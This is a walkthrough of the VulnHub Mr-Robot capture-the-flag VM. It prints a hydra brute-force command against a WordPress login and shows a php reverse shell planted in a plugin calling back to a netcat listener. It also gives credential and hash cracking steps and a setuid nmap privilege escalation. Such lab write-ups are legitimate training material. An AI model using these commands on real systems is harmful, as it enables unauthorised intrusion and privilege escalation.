It's time for another CTF writeup, this time [Mr-Robot](https://www.vulnhub.com/entry/mr-robot-1,151/) by [Jason](https://www.vulnhub.com/author/jason,292/).
I solved this one quite a while ago, but not until now I decided to clean up my walkthrough notes, make a decent writeup and post it here.

From the description:

> Based on the show, Mr. Robot.
> This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find.
> The VM isn't too difficult. There isn't any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.

It seems appropiate, so let's go for it, shall we?

## Web server

First things first, let's discover and scan the VM in search of exposed services to see what we can play with:

```
root@kali:~# nmap -A -p1-65535 192.168.56.103

Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-01 19:28 CEST

```

The web server at `80` and `443` shows the official Mr. Robot promotional website. As it's pretty big and seems pretty much the same as the real thing, we keep searching for the moment. 

Let's try `/robots.txt`.

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```
Oh, that seems interesting. We can proceed to obtain our first flag:

```
wget http://192.168.56.103/fsocity.dic -o fsocity.dic
wget http://192.168.56.103/key-1-of-3.txt -o key-1-of-3.txt
```

OK, great, but what now? Since exploring the web server manually seems like a bit of a pain, we can try with a fuzzer and cross our fingers:

```
root@kali:~/vulnhub/mr_robot# dirb http://192.168.56.103
```

This reveals a /0/ directory, which is a wonderful WordPress! Time to run `wpscan`:

```
root@kali:~# wpscan -u http://192.168.56.103/0/
```

It only finds two XSS vulnerabilities which won't help us to get in...

Meanwhile, our fuzzer, which is still running, finds a nice login page at `/wp-login`.

After some basic tries (`admin/admin`, `user/user`, etc), a somewhat strange error message appears when trying the user `elliot` (obvious choice given the VM theme):

```
ERROR: The password you entered for the username elliot is incorrect. Lost your password?
```

Easy user enumeration, indeed! ;-) But we got our user, and we got a dictionary. Time to wake the Hydra.

```
hydra -l elliot -P fsocity.dic 192.168.56.103 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:ERROR:H=Cookie\: s_cc=true; s_fid=648F0BAE8E7E6EDD-276B7EA6AFF87532; s_nr=1469962865654; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check"
```

So we got our fuzzer and our hydra running... What else can we do?

Peeking on some of the `dirb` results, we find this `license` page, which says:

```
what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
```

At this point, this seems just a taunt so we could pretty much ignore it for the moment (after acknowledging, of course, that it's a quote from Mr. Robot). But as `hydra` is taking forever and we can't find much more interesting things in the `dirb` results, we have no choice but to come back and give a second look. And, oh surprise, it tourns out we hadn't scrolled down in the page... There's more text in there:

```
do you want a password or something?
ZWxsaW90OkVSMjgtMDY1Mgo=
```

Damn! I have to admit I got trolled by this simple scrolling trick. Shame on me. But w/e, that's a Base64 encoded string for sure, so we can proceed to decode it:

```
root@kali:~# echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
elliot:ER28-0652
```

Are these the precious credentials we are painly trying to find by brute force? After entering them in the WordPress login page, the admin panel appears before our eyes.
	
Oh, well. If we had started here...

## Low-privileged shell

Now we have administrative access, we can go ahead and upload a pretty php shell into any of the plugins that are installed on the site. For the sake of simplicity, let's just use the good old`php-reverse-shell` that comes with Kali. So after setting the listener, and activating the 'modified' plugin, we are all set:

```
root@kali:~# nc -lvvp 443
listening on [any] 443 ...
192.168.56.103: inverse host lookup failed: Unknown host
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 39860
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux

$     
```

Sweet! Time to work on a more acceptable tty shell:

```
$ python -c 'import pty; pty.spawn("/bin/bash");'
daemon@linux:/$ 
```

And let's start peeking around. A quick look to `/etc/passwd` file reveals one interesting user:

```
daemon@linux:/$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

mysql:x:1001:1001::/home/mysql:
varnish:x:999:999::/home/varnish:
robot:x:1002:1002::/home/robot:
```

So `robot` is our man (or, you know, robot). The next logical step is to check his/her/its home directory:

```
daemon@linux:/$ cd /home/robot
cd /home/robot
daemon@linux:/home/robot$ ls -lah
ls -lah
total 16K
drwxr-xr-x 2 root  root  4.0K Nov 13  2015 .
drwxr-xr-x 3 root  root  4.0K Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

That's our second key! And also what seems to be a RAW-MD5 encoded password hash. The obvious choice seems running `john` straight away, but it's always a good shot to try and google the hash: it works more often than it should. And, indeed, the hash is known to be the following ultra super safe password:

`abcdefghijklmnopqrstuvwxyz`

SECURITY. But we are OK with it, now we can just `su` into `robot`:

```
daemon@linux:/home/robot$ su robot
su robot

Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ 
```

Nice, we are near!

## Robot

So we look for interesting files for a while. Normally, one would try to find some files with `setuid` permissions and try to use them to get root. The usual trick to find such files works like a charm:

```
robot@linux:~$ find / -user root -perm -4000 2>/dev/null
find / -user root -perm -4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

Nothing interesting, right? ...Right? Because having `setuid` `nmap` is completely normal, right? Well, for some reason, my brain decides it's perfectly fine so I start searching for other ways to reach root. After frustrating myself for a while, I decide to go back over my steps (as you can see this is the second time I overlook a pretty obvious hint, but that's me), and finally notice that `nmap` shouldn't be there.

But even then, why does it matter? How are we going to get root, by scanning the sh*t out of ourselves? Well, a probably better option is to Google a bit, and surprise! Some old versions of `nmap` have a `privesc` vulnerability which allow command execution. As [@bonsaiviking](https://twitter.com/bonsaiviking) said in a [tweet](https://twitter.com/bonsaiviking/status/273646657307033600):

>nmap --script <(echo 'os.execute("/bin/sh")') # setuid nmap privesc. Older version? try nmap --interactive [@pentestcli](https://twitter.com/pentestcli)

What do we have to lose?

```
robot@linux:~$ nmap --interactive
nmap> !sh
# id
uid=1002(robot) gid=1002(robot) euid=0(rooot) groups=0(root),1002(robot)
```

Wow! That worked! As I process how cool that was, half of my brain is already getting the last key and carefully saving it along the others. That means challenge complete!
 
Big thanks to [Jason](https://www.vulnhub.com/author/jason,292/) for working on a VM themed after one of my favorite TV shows, and [VulnHub](https://www.vulnhub.com/) for hosting it. See you in the next one!
